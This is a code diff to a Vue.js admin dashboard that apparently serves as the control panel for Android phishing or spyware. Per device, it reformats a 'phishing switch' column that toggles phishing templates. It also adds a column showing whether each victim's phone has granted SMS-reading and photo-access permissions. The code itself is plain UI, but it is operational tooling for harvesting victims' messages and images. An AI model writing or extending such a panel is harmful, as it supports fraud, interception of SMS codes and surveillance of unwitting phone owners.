@@ -104,10 +104,26 @@
 
       <el-table-column label="钓鱼开关" header-align="center" align="right" width="150px">
         <template v-slot="scope">
-          <el-switch v-for="item in fishTemplateList" :key="item.code" :inactive-text="item.label" :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]"
-          @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
+          <el-switch v-for="item in fishTemplateList" :key="item.code" :inactive-text="item.label"
+            :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]"
+            @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
 
         </template>
+      </el-table-column>
+
+      <el-table-column label="权限" header-align="center" align="center" width="70px">
+        <template v-slot="scope">
+          <div v-for="(value, key) in scope.row.permissions" :key="key">
+
+            <el-tag :type="value ? 'success' : 'danger'">{{ permissionsName[key] }}
+              <el-icon>
+                <Select v-if="value" />
+                <Close v-else />
+              </el-icon></el-tag>
+          </div>
+
+        </template>
+
       </el-table-column>
       <el-table-column label="设备状态" header-align="center" align="right" width="150px">
         <template v-slot="scope">
@@ -346,7 +362,11 @@ export default defineComponent({
       albumListVisible,
       currentAlbumDevice,
       lastActivityTimeRange,
-      fishTemplateList
+      fishTemplateList,
+      permissionsName: {
+        "android.permission.READ_SMS": "短信",
+        "android.permission.READ_MEDIA_IMAGES": "相册",
+      }
     };
   },
   async mounted() {
@@ -541,11 +561,11 @@ export default defineComponent({
           this.getDataList();
         } else {
           ElMessage.error(msg || "更新失败");
-          
+
         }
       } catch (error) {
         ElMessage.error("更新失败");
-     
+
       }
 
 
